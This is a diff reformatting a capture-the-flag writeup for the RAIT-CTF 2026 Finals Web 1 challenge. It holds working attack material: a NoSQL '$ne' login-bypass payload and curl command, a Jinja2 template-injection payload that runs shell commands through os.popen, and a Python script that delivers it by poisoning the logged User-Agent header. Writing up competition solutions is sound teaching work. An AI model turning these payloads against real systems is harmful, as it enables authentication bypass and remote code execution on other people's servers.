@@ -3,8 +3,7 @@ title: "RAIT-CTF Finals Web 1"
 description: "Writeup for RAIT-CTF Finals Web 1 from RAIT-CTF 2026 Finals."
 date: 2026-07-06 22:45:00
 categories:
-  - CTF
-  - Writeups
+  - [Writeups, 周刊]
 tags:
   - RAIT-CTF
   - Web Exploitation
@@ -12,72 +11,77 @@ tags:
 
 # RAIT-CTF Finals Web 1
 
-Flag:  RAIT-CTF{l0g_p01s0n1ng_plu5_sst1_equ4ls_rc3}
+**Flag:** `RAIT-CTF{l0g_p01s0n1ng_plu5_sst1_equ4ls_rc3}`
 
-Approach (Step by Step):
+## Approach (Step by Step)
 
-1.  Authentication Bypass (NoSQL Injection)
+### 1. Authentication Bypass (NoSQL Injection)
 
+Visiting `http://34.0.14.121:9954/login` reveals a login form. Analyzing the source code shows that the form submits data as JSON:
 
-Visiting `http://34.0.14.121:9954/login` reveals a login form. Analyzing the source code shows
-that the form submits data as JSON:
+```javascript
 const res = await fetch('/login', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ username, password })
 });
+```
 
-RAIT-CTF Final Round Report
+We can bypass the authentication by exploiting a NoSQL injection vulnerability. By passing an object operator like `$ne` (not equal), we force the query to evaluate to true.
 
-Payload:
-
+**Payload:**
+```json
 {
     "username": {"$ne": null},
     "password": {"$ne": null}
 }
+```
 
+We can use `curl` to trigger this login and save the resulting session cookie:
+```bash
 curl -X POST http://34.0.14.121:9954/login \
-     -H "Content-Type: application/json" \
-     -d '{"username": {"$ne": null}, "password": {"$ne": null}}' \
-     -c cookies.txt
+-H "Content-Type: application/json" \
+-d '{"username": {"$ne": null}, "password": {"$ne": null}}' \
+-c cookies.txt
+```
 
-Cookies =
-eyJ0cmFja2VyX3Rva2VuIjoiOWJhZjkwZDMtMGMyYi00YmM5LWFhN2UtODg4MjBhNWVmMmI3Iiwi
-dXNlciI6eyIkbmUiOm51bGx9fQ.aX3gEQ.fzHTbnmIqHTQsyY9P0H-InOGGNk
+This returns an admin session cookie like:
+`eyJ0cmFja2VyX3Rva2VuIjoiOWJhZjkwZDMtMGMyYi00YmM5LWFhN2UtODg4MjBhNWVmMmI3Iiwi...`
 
-2.  SSTI via Log Poisoning
+### 2. SSTI via Log Poisoning
 
-Payload
-We use a standard Python Jailbreak payload to access `os.popen`.
+We use a standard Python Jailbreak payload to access `os.popen`. The payload uses the `url_for` global to access builtins -> `import os` -> `popen`.
+
+**SSTI Payload:**
+```jinja2
 {{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /app/data/safe_flag.txt').read() }}
+```
 
-Automated Exploit Script
+### 3. Automated Exploit Script
+
+The application logs the User-Agent header of incoming requests. By poisoning our User-Agent with the SSTI payload, we can trigger code execution when the admin views the logs page (`/?page=view_log`).
+
+```python
 import requests
 import re
 
 # Configuration
 TARGET_URL = "http://34.0.14.121:9954"
 ADMIN_COOKIE = {
-    "session":
-"eyJ0cmFja2VyX3Rva2VuIjoiOWJhZjkwZDMtMGMyYi00YmM5LWFhN2UtODg4MjBhNWVmMmI3Iiw
-idXNlciI6eyIkbmUiOm51bGx9fQ.aX3gEQ.fzHTbnmIqHTQsyY9P0H-InOGGNk"
+    "session": "eyJ0cmFja2VyX3Rva2VuIjoiOWJhZjkwZDMtMGMyYi00YmM5LWFhN2UtODg4MjBhNWVmMmI3IiwidXNlciI6eyIkbmUiOm51bGx9fQ.aX3gEQ.fzHTbnmIqHTQsyY9P0H-InOGGNk"
 }
 
 def solve():
     print(f"[*] Targeting: {TARGET_URL}")
 
-   plain # 1. Inject Payload into User-Agent (Log Poisoning)
-    # The payload uses the 'url_for' global to access builtins -> import os -> popen
-    payload = "{{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat
-/app/data/safe_flag.txt').read() }}"
-
-   plain headers = {
+    # 1. Inject Payload into User-Agent (Log Poisoning)
+    payload = "{{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /app/data/safe_flag.txt').read() }}"
+    
+    headers = {
         "User-Agent": payload
     }
-
+    
     print("[*] Sending malicious User-Agent...")
-
-
 
     try:
         # We visit the root page so it logs our access (and our malicious User-Agent)
@@ -102,7 +106,6 @@ def solve():
                 return flag
             else:
                 print("[-] Flag not found in response. Check if payload executed.")
-                # print(f"Response Preview:\n{r.text[:500]}")
         else:
             print(f"[-] Failed to access logs. Status Code: {r.status_code}")
 
@@ -111,7 +114,10 @@ def solve():
 
 if __name__ == "__main__":
     solve()
+```
 
-3.  You will get the flag as output
+### 4. Flag Retrieval
 
-RAIT-CTF{l0g_p01s0n1ng_plu5_sst1_equ4ls_rc3}
+Running the script successfully retrieves the flag from the server:
+
+`RAIT-CTF{l0g_p01s0n1ng_plu5_sst1_equ4ls_rc3}`
